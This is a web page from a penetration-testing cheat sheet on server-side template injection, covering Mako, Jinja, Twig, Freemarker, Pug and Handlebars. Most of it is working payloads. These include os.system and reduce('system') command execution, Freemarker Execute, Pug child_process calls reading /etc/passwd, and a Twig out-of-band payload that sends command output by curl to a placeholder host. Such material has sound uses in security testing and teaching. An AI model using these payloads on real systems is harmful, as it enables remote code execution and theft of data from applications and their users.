<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.exceptions.traceback.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.exceptions.util.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template._mmarker.module.cache.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.cache.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.attr._NSAttr__parent.template.module.cache.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template._mmarker.module.filters.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template._mmarker.module.runtime.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.attr._NSAttr__parent.module.cache.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template._mmarker.module.runtime.exceptions.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.filters.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.runtime.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.attr._NSAttr__parent.template.module.runtime.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.context._with_template._mmarker.module.cache.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.runtime.exceptions.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.attr._NSAttr__parent.module.filters.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.attr._NSAttr__parent.module.runtime.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.context._with_template.module.cache.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.module.runtime.exceptions.compat.inspect.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.attr._NSAttr__parent.module.runtime.exceptions.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.context._with_template._mmarker.module.runtime.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.context._with_template.module.filters.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.context._with_template.module.runtime.compat.inspect.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.context._with_template.module.runtime.exceptions.util.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#d88200">${</span><span style="color:#111">self</span><span style="color:#111">.template.module.runtime.exceptions.traceback.linecache.os.system(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
<span style="color:#f92672">{{</span>self._TemplateReference__context.cycler.__init__.__globals__.os<span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span>self._TemplateReference__context.joiner.__init__.__globals__.os<span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span>self._TemplateReference__context.namespace.__init__.__globals__.os<span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span>cycler.__init__.__globals__.os<span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span>joiner.__init__.__globals__.os<span style="color:#f92672">}}</span>
<span style="color:#f92672">{{</span>namespace.__init__.__globals__.os<span style="color:#f92672">}}</span>
</code></pre></div><h2 id="exploitation">Exploitation</h2>
<p>Our major goal is to collect RCE once we&rsquo;ve located a template engine and determined which engine is in use. This, however, may not always be possible.</p>
<ul>
<li>XSS is the most exploitable of the templating engines that are rendered on the client.</li>
<li>If the templating engine has access to the underlying language, we might be able to get RCE for server-side rendering.</li>
<li>We may be able to read files from the local system or display sensitive variables if this is not the case.</li>
</ul>
<p>We will cover the following template injection</p>
<ol>
<li>Twig - Discovery and Exploitation</li>
<li>Apache Freemarker - Discovery and Exploitation</li>
<li>Pug - Discovery and Exploitation</li>
<li>Jinja - Discovery and Exploitation</li>
<li>Mustache and Handlebars - Discovery and Exploitation</li>
</ol>
<h2 id="twig-php-symfony">TWIG PHP (Symfony)</h2>
<p>TWIG  is commonly paired with PHP applications. Such as Symfony framework.</p>
<h3 id="the-basic-syntex-of-twig-template">The basic syntex of Twig template.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{</span>% <span style="color:#00a8c8">if</span> not admin %<span style="color:#f92672">}</span>sudo <span style="color:#f92672">{</span>% endif %<span style="color:#f92672">}</span>I am feeling great, <span style="color:#f92672">{{</span>name<span style="color:#111">|</span>capitalize<span style="color:#f92672">}}</span>
</code></pre></div><h3 id="payload-to-detect-if-php-language">Payload to Detect if PHP language.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span>7*<span style="color:#d88200">&#39;7&#39;</span><span style="color:#f92672">}}</span>
</code></pre></div><p>The output is 25. This is because PHP does not check the type of the variable and will automatically treat &lsquo;5&rsquo; like the number 5. We can leverage this to help us discover what templating engine is in use</p>
<h3 id="payload-to-detect-twig">Payload To Detect TWIG</h3>
<p>Twig allows us to trim whitespace by adding a &ldquo;-&rdquo; character to the delimiter. Â This means that if we add a couple of extra spaces, use a statement with the &ldquo;-&rdquo; character, then inspect the output, the extra whitespaces should be removed if the target is running Twig.</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">This
is
Not
     <span style="color:#f92672">{{</span>-<span style="color:#d88200">&#39;Whitespace&#39;</span>-<span style="color:#f92672">}}</span>
</code></pre></div><h2 id="twig-exploitation">TWIG Exploitation.</h2>
<p>Twig does not advertise direct access to its underlying language (PHP). it does provide several filters that might be useful for us. For example, filters like <strong>filter, join, map, reduce, slice, and sort</strong>  they might accept functions for additional processing.</p>
<h3 id="print-array">Print array</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span>SECRET_ARRAY<span style="color:#111">|</span>join <span style="color:#f92672">}}</span>
</code></pre></div><h3 id="rce-payload">RCE Payload.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{[</span>0<span style="color:#f92672">]</span><span style="color:#111">|</span>reduce<span style="color:#f92672">(</span><span style="color:#d88200">&#39;system&#39;</span>,<span style="color:#d88200">&#39;cat /opt/data/flag.txt&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">}}</span>
</code></pre></div><h3 id="out-of-bound-exploitation-payload">Out of bound exploitation Payload</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{</span>% <span style="color:#111">set</span> output %<span style="color:#f92672">}</span>
<span style="color:#f92672">{{[</span>0<span style="color:#f92672">]</span><span style="color:#111">|</span>reduce<span style="color:#f92672">(</span><span style="color:#d88200">&#39;system&#39;</span>,<span style="color:#d88200">&#39;id&#39;</span><span style="color:#f92672">)}}</span>
<span style="color:#f92672">{</span>% endset %<span style="color:#f92672">}</span>
<span style="color:#f92672">{</span>% <span style="color:#111">set</span> <span style="color:#111">exfil</span> <span style="color:#f92672">=</span> output<span style="color:#111">|</span> url_encode %<span style="color:#f92672">}</span>
<span style="color:#f92672">{{[</span>0<span style="color:#f92672">]</span><span style="color:#111">|</span>reduce<span style="color:#f92672">(</span><span style="color:#d88200">&#39;system&#39;</span>,<span style="color:#d88200">&#39;curl http://x.x.x.x/?exfil=&#39;</span> ~ exfil<span style="color:#f92672">)}}</span>
</code></pre></div><h2 id="freemarker-java">Freemarker JAVA</h2>
<p>Apache Freemarker is commonly paired with Java applications</p>
<h3 id="the-basic-syntex-of-freemarker-template">The basic syntex of Freemarker template.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;h1&gt;Hello <span style="color:#d88200">${</span><span style="color:#111">name</span><span style="color:#d88200">}</span>!&lt;/h1&gt;
&lt;<span style="color:#75715e">#if name == &#34;khan&#34;&gt;</span>
The best reasons you will win :
  &lt;<span style="color:#75715e">#list reasons as reason&gt;</span>
   <span style="color:#d88200">${</span><span style="color:#111">reason</span><span style="color:#111">?index + 1</span><span style="color:#d88200">}</span>: <span style="color:#d88200">${</span><span style="color:#111">reason</span><span style="color:#d88200">}</span>
  &lt;/#list&gt;
&lt;/#if&gt;
</code></pre></div><h3 id="payload-to-detect-if-java-language">Payload to Detect if Java language.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#d88200">${</span><span style="color:#111">7</span><span style="color:#111">*</span><span style="color:#d88200">&#39;7&#39;</span><span style="color:#d88200">}</span>
</code></pre></div><p>In the output error will occured. This is because JAVa does check the type of the variable.</p>
<h3 id="payload-to-detect-freemarker">Payload To Detect Freemarker</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#d88200">${</span><span style="color:#111">7</span><span style="color:#111">*</span><span style="color:#d88200">&#39;7&#39;</span><span style="color:#d88200">}</span>
</code></pre></div><p>we notice &ldquo;${&rdquo; is used as a delimiter, and the application crashes when multiplying a string, we can guess that the target is running Freemarker.</p>
<h3 id="print-array-1">Print Array</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;<span style="color:#75715e">#list SECRET_ARRAY as x&gt;</span>
  <span style="color:#d88200">${</span><span style="color:#111">x</span><span style="color:#d88200">}</span>
&lt;/#list&gt;
</code></pre></div><h3 id="rce-payload-1">RCE Payload.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;<span style="color:#75715e">#assign ex = &#34;freemarker.template.utility.Execute&#34;?new()&gt;${ ex(&#34;id&#34;)}</span>
<span style="color:#f92672">[</span><span style="color:#75715e">#assign ex = &#39;freemarker.template.utility.Execute&#39;?new()]${ ex(&#39;id&#39;)}</span>
<span style="color:#d88200">${</span><span style="color:#d88200">&#34;freemarker.template.utility.Execute&#34;</span><span style="color:#111">?new()(</span><span style="color:#d88200">&#34;id&#34;</span><span style="color:#111">)</span><span style="color:#d88200">}</span>
</code></pre></div><h2 id="pug-nodejs">PUG NodeJS</h2>
<p>Pug, previously known as Jade. Pug is commonly integrated with the Express2 framework in a NodeJS3 application.</p>
<h3 id="the-basic-syntex-of-pug-template">The basic syntex of PUG template.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">h1 Hello, <span style="color:#75715e">#{name}</span>
input<span style="color:#f92672">(</span><span style="color:#111">type</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;hidden&#39;</span> <span style="color:#111">name</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;admin&#39;</span> <span style="color:#111">value</span><span style="color:#f92672">=</span><span style="color:#d88200">&#39;true&#39;</span><span style="color:#f92672">)</span>

<span style="color:#00a8c8">if</span> showSecret
  - <span style="color:#111">secret</span> <span style="color:#f92672">=</span> <span style="color:#f92672">[</span><span style="color:#d88200">&#39;A&#39;</span>,<span style="color:#d88200">&#39;B&#39;</span>, <span style="color:#d88200">&#39;C&#39;</span><span style="color:#f92672">]</span>
  p The Topsecrets are: 
  each val in secret
    p <span style="color:#75715e">#{val}</span>
<span style="color:#00a8c8">else</span>
  p No data <span style="color:#00a8c8">for</span> you!
</code></pre></div><h3 id="payload-to-detect-pug">Payload To Detect PUG</h3>
<p>We&rsquo;ll use the payload</p>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#{&#34;7&#34;*7}</span>
</code></pre></div><ol>
<li>We&rsquo;ll know that we are most likely dealing with a language that is not strictly handling variables, like JavaScript or PHP.</li>
<li>Pug expects the first word of a line to be a tag, it will encompass this in &amp;lt and &amp;gt signs. we notice &ldquo;&lt;49&gt;&rdquo; as output.</li>
</ol>
<h3 id="payload-to-exploit-pug">Payload To Exploit PUG</h3>
<ol>
<li>Check if require is present.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">- require
</code></pre></div><ol start="2">
<li>We dont have direct access to require object. We can use global variables.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">- global.process.mainModule.require
</code></pre></div><ol start="3">
<li>Now we can call require.</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">- var <span style="color:#111">require</span> <span style="color:#f92672">=</span> global.process.mainModule.require
- require<span style="color:#f92672">(</span><span style="color:#d88200">&#39;child_process&#39;</span><span style="color:#f92672">)</span>
</code></pre></div><ol start="4">
<li>Exploit using spawansync</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">- var <span style="color:#111">require</span> <span style="color:#f92672">=</span> global.process.mainModule.require
<span style="color:#f92672">=</span> require<span style="color:#f92672">(</span><span style="color:#d88200">&#39;child_process&#39;</span><span style="color:#f92672">)</span>.spawnSync<span style="color:#f92672">(</span><span style="color:#d88200">&#39;cat&#39;</span>, <span style="color:#f92672">[</span><span style="color:#d88200">&#39;/etc/passwd&#39;</span><span style="color:#f92672">])</span>.stdout
</code></pre></div><h2 id="jinja--python">Jinja  Python</h2>
<p>Jinja is a templating engine for Python.</p>
<h3 id="the-basic-syntex-of-jinja-template">The basic syntex of Jinja template.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;h1&gt;Hey <span style="color:#f92672">{{</span> name <span style="color:#f92672">}}</span>&lt;/h1&gt;
<span style="color:#f92672">{</span>% <span style="color:#00a8c8">if</span> reasons %<span style="color:#f92672">}</span>
The best reasons you will win :
&lt;ul&gt;
<span style="color:#f92672">{</span>% <span style="color:#00a8c8">for</span> r in reasons %<span style="color:#f92672">}</span>
	&lt;li&gt;<span style="color:#f92672">{{</span>r<span style="color:#f92672">}}</span>&lt;/li&gt;
<span style="color:#f92672">{</span>% endfor %<span style="color:#f92672">}</span>
&lt;/ul&gt;
<span style="color:#f92672">{</span>% endif %<span style="color:#f92672">}</span>
</code></pre></div><h3 id="payload-to-detect-jinja">Payload To Detect Jinja</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span>5*<span style="color:#d88200">&#34;5&#34;</span><span style="color:#f92672">}}</span>
</code></pre></div><ol>
<li>First indicator output will be 55555.</li>
<li>Another indicator is accessing global variables.</li>
<li>Jinja has six global variables: <strong>config, request, session, g, url_for(), and get_flashed_messages()</strong>.</li>
</ol>
<h3 id="payload-to-print-sensitive-information">Payload To print sensitive information.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span>config<span style="color:#111">|</span>pprint<span style="color:#f92672">}}</span>
</code></pre></div><h2 id="mustache-and-handlebars">Mustache and Handlebars</h2>
<p>Handlebars libraries are avilable for Java, .NET, PHP.</p>
<h3 id="the-basic-syntex-of-handlebars-template">The basic syntex of Handlebars template.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;h1&gt;Hello <span style="color:#f92672">{{</span>name<span style="color:#f92672">}}</span>&lt;/h1&gt;
  <span style="color:#f92672">{{</span><span style="color:#75715e">#if vorname}}</span>
  Also known as:
    <span style="color:#f92672">{{</span><span style="color:#75715e">#each vorname}}</span>
        <span style="color:#f92672">{{</span>this<span style="color:#f92672">}}</span>
    <span style="color:#f92672">{{</span>/each<span style="color:#f92672">}}</span>
  <span style="color:#f92672">{{</span>/if<span style="color:#f92672">}}</span>
</code></pre></div><h3 id="payload-to-read-directories">Payload To read directories.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">{{</span><span style="color:#75715e">#each (readdir &#39;/etc&#39;)}}</span>
        <span style="color:#f92672">{{</span>this<span style="color:#f92672">}}</span>
   <span style="color:#f92672">{{</span>/each<span style="color:#f92672">}}</span>
  
</code></pre></div><h3 id="payload-to-read-file">Payload To read file.</h3>
<div class="highlight"><pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span><span style="color:#111">read</span> <span style="color:#d88200">&#39;/etc/passwd&#39;</span><span style="color:#f92672">}}</span>
</code></pre></div><h2 id="automate-tools">Automate Tools</h2>
<p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
<h2 id="refrences">Refrences</h2>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md</a></li>
</ul>


    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/cheatsheet/blog/" title="Blogs"> <i class="fa fa-chevron-left"></i><label>Blogs</label></a>
    <a class="nav nav-next" href="/cheatsheet/blog/attacking-active-directory-for-pentesters/" title="Attacking Active Directory for Pentesters" style="margin-right: 0px;"><label>Attacking Active Directory for Pentesters</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    
    <div class="tags"> 
      
        <a class="label label-default" href="/cheatsheet/tags/web">Web</a>
      
        <a class="label label-default" href="/cheatsheet/tags/ssti">SSTI</a>
      
    </div>
    

    

    
    <div class="date">
        <i class='fa fa-calendar'></i> Last update on 18/04/2022
    </div>
    

    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/cheatsheet/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
    
        var baseurl = "\/cheatsheet\/";
    
</script>
<script src="/cheatsheet/js/clipboard.min.js"></script>
<script src="/cheatsheet/js/featherlight.min.js"></script>

<script type="text/javascript" src="/cheatsheet/js/lunr.min.js"></script>
<script type="text/javascript" src="/cheatsheet/js/auto-complete.js"></script>
<script type="text/javascript" src="/cheatsheet/js/search.js"></script>
<script src="/cheatsheet/theme-flex/script.js"></script>




<script src="/cheatsheet/js/scripts.min.js"></script>
    

    
    

    
  </body>
</html>